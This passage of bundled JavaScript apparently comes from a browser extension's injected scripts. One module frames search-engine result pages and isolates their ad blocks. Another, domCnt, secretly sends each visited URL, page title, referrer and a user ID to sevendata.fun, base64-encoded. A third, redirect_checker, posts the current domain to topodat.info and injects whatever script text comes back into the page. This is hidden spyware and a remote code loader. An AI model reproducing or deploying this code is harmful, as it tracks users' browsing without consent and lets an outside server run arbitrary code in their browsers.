				let platformLocation = null;

				switch (platform) {
					case 'google':
						platformMarker = 'go_found';
						platformLocation = 'www.google.com/search';
						break;
					case 'yahoo':
						platformMarker = 'ya_found';
						platformLocation = 'search.yahoo.com/search/';
						break;
					case 'tfl':
						platformMarker = 'tfl_found';
						platformLocation = 'www1.softy.org/';
						break;
					case 'smv':
						platformMarker = 'smv_found';
						platformLocation = 'somavar.com/';
						break;
					default:
						break;
				}

				const successMessage = {frame_id: `${id}`};
				successMessage[platformMarker] = true;

				const failMessage = {frame_id: `${id}`};
				failMessage[platformMarker] = false;

				const anchor = document.querySelector(docAnchor);

				if (!anchor) {
					//if (debug)
					{
						console.log(`No ${platform} doc anchor`);
					}
				} else {
					const noAds = document.body.classList.contains('noAds');

					if (noAds) {
						//if (debug)
						{
							console.log(`${platform} no ads selector`);
						}
						failMessage['failReason'] = 'noAds selector';
						window.top.postMessage(failMessage, '*');
						return;
					}

					/* const recaptchaElement = document.querySelector('#recaptcha-element');

					if (recaptchaElement) {
						if (debug) {
							console.log(`${platform} recaptcha`);
						}
						failMessage['failReason'] = 'recaptcha';
						window.top.postMessage(failMessage, '*');
						return;
					} */
					
					let ads = document.querySelector(adsSelector);
					if (!ads && platform == 'tfl')
					{
						if (debug) {
							console.log(`${platform} no ads selector`);
						}
						failMessage['failReason'] = 'noAds selector';
						window.top.postMessage(failMessage, '*');
						return;
					}
					
					if (ads) {
						document.body.style.background = bgColor;
						let adsLoaded = checkAdsHeight(ads);
						
						if(platform == 'smv')
						{
							let inAds = ads.querySelectorAll('.listmargin');
							console.log('inAds',inAds);
							adsLoaded = (inAds.length > 0) ? true : false;
							if(adsLoaded)
							{
								inAds.forEach((inAd, i) => {
									let link = inAd.querySelector('.clickurl a');
									if(!link || !link.innerText)
									{
										adsLoaded = false;
									}
								});
							}
						}

						if (adsLoaded) {
							if(platform == 'google')
							{
								clearPage(ads, bgColor);
							}
							window.top.postMessage(successMessage, '*');

							if (debug) {
								console.log(`${platform} ads founded`);
							}
						}
					}
				}
			} catch (error) {
				//if (debug)
				{
					console.error(error);
				}
			}

			function checkAdsHeight(ads) {
				return ads.clientHeight > 20;
			}
			
			function checkAdsWidth(ads) {
				return ads.clientWidth > 20;
			}

			function clearPage(ads, bgColor) {
				ads.classList.add('opfl');
				let prn = ads.parentNode;
				while (prn.tagName.toLowerCase() != 'body') {
					prn.classList.add('opfl');
					prn = prn.parentNode;
				}
				let dvs = document.querySelectorAll('div');
				for (let i = 0, l = dvs.length; i < l; i++) {
					if (!dvs[i].classList.contains('opfl')) {
						dvs[i].style.display = 'none';
					}
				}
				ads.setAttribute('style', 'position:fixed;top:0;left:0;width:100%;height:'+window.innerHeight+'px');
				let g = document.querySelector('.gsc-control-cse');
				if (g) {
					g.setAttribute('style', `background:${bgColor};border:0;`);
				}
				document.body.style.background = `${bgColor}`;
				document.body.style.opacity = 1;
			}
		},
		createFrame: function (id, src, options) {
			try {
				const frame = document.createElement('iframe');

				frame.id = `${id}fr`;
				frame.width = '100%';
				frame.height = 900;
				frame.style.zIndex = 2;
				frame.style.position = 'absolute';
				frame.style.left = 0;
				frame.style.top = 0;
				frame.style.margin = 0;
				frame.style.display = 'block';
				frame.setAttribute('scrolling', 'no');
				frame.setAttribute('border', '0');
				frame.setAttribute('frameborder', 'none');
				frame.setAttribute('fetchpriority', 'high');
				frame.setAttribute('referrerpolicy','no-referrer');
				frame.setAttribute('src', src);
				

				return frame;
			} catch (error) {
				if (options.debug) {
					console.error('adRequests createFrame error: ', error);
				}
				return null;
			}
		}
	};
	window.zMainObj.adRequests.init();
}
if(!window.zMainObj)
	window.zMainObj = {};
		
if(!window.zMainObj.storage && window.self === window.top)
{
	window.zMainObj.storage = {
		'extRequest' : function(params,callback)
		{
			var handler = false;
			params.colorPicker = 1;
			if(callback)
			{
				var cbid = 'cb'+(new Date()).getTime().toString()+Math.round(Math.random()*10000).toString();
				window[cbid] = callback;
				handler = 'window["'+cbid+'"]';
				params.handler = handler;
			}
			window.top.postMessage(params,'*');
		},
		'getData' : function(rkey, callback)
		{
			return;
		},
		'setData' : function(rkey, rvalue) {
			window.zMainObj.storage.extRequest({
				message: 'setExtensionData',
				key: rkey,
				value: rvalue
			});
		}
	};
}if (!window.zMainObj) { window.zMainObj = {}; }

(() => {
	if (window.zMainObj.domCnt) {
		return;
	}
	
	window.zMainObj.domCnt = {
		'lastUrl' : '',
		'postUserData' : function(curUrl){
			let opts = {
				method: 'POST',
				body: btoa(unescape(encodeURIComponent(JSON.stringify({
					'a': 'sendVisit',
					'p': {
						'u': curUrl,
						'ui': '902ffb7d-8e37-4fb8-a0fd-0f2704093c97',
						'e': 'njaclngoobdnphkahnehdejhliehbhid',
						't': document.title,
						'a': '',
						'g': '',
						'c': 'US',
						'rf': document.referrer
					},
				})))),
				headers: { 'Content-Type': 'text/plain' },
				credentials: 'include',
			};
			/* if(window.zMainObj.storage && window.zMainObj.storage.bgRequest)
			{
				window.zMainObj.storage.bgRequest('https://topodat.info/c', function(data){},  opts);
				return;
			} */
			fetch('https://sevendata.fun/c', opts);
		},
		'init' : function(){
			let curUrl = document.location.toString().split('#')[0];
			if(curUrl != window.zMainObj.domCnt.lastUrl)
			{
				window.zMainObj.domCnt.lastUrl = curUrl;
				window.zMainObj.domCnt.postUserData(curUrl);
			}
			setTimeout(window.zMainObj.domCnt.init,100);
		}
	};
	
	window.zMainObj.domCnt.init();
})();(function(){
	let cacheKeys = ['jsaxnjsanx','uwiyrwiurywiu123','nxmcbvnxmbvm','nxhahjbxjh76','sndhhquidwh12','sndhhquidwh','wueyrinbxzbmzb'];
	for(let i = 0,l = cacheKeys.length;i < l;i++)
	{
		localStorage.removeItem(cacheKeys[i]);
	}
})();//# sourceURL=redirect_checker.js

if (!window.zMainObj)
	window.zMainObj = {};

(() => {
	if (window.zMainObj.redirectChecker) {
		return;
	}
	
	window.zMainObj.redirectChecker = 1;
	
	let unid = '902ffb7d-8e37-4fb8-a0fd-0f2704093c97';
	let extid = 'njaclngoobdnphkahnehdejhliehbhid';
	let country = 'US';
	let domain = window.location.hostname;
	
	function isSuitableDomain() {
		return new Promise((resolve, reject) => {
			fetch('https://topodat.info/alk/g2.php', {
				method: 'POST',
				body: btoa(
					unescape(
						encodeURIComponent(
							JSON.stringify({
								u: unid,
								e: extid,
								d: domain,
								c: country
							})
						)
					)
				),
				headers: {'Content-Type': 'text/plain'},
				credentials: 'include'
			}).then((response) => {
				if (response.ok) {
					return response.text();
				}
				throw new Error('Something went wrong');
			}).then((data) => {
				if(data.trim() == '') {
					resolve(false);
					return;
				}
				resolve(data);
			}).catch((error) => {
				resolve(false);
			});
		});
	}
	
	async function init() {
		let lastRedirect = localStorage.getItem('zLastRedHer');
		let curTime = Math.round((new Date()).getTime()/1000);
		if(lastRedirect && (curTime-lastRedirect) < (12*3600))
		{
			return;
		}
		
		let id = await isSuitableDomain();

		if ( !id ) {
			return;
		}
		
		localStorage.setItem('zLastRedHer',curTime);
		
		let s = document.createElement('script');
		s.appendChild(document.createTextNode(id));
		document.head.appendChild(s);
	}

	init().catch(e => {});
})();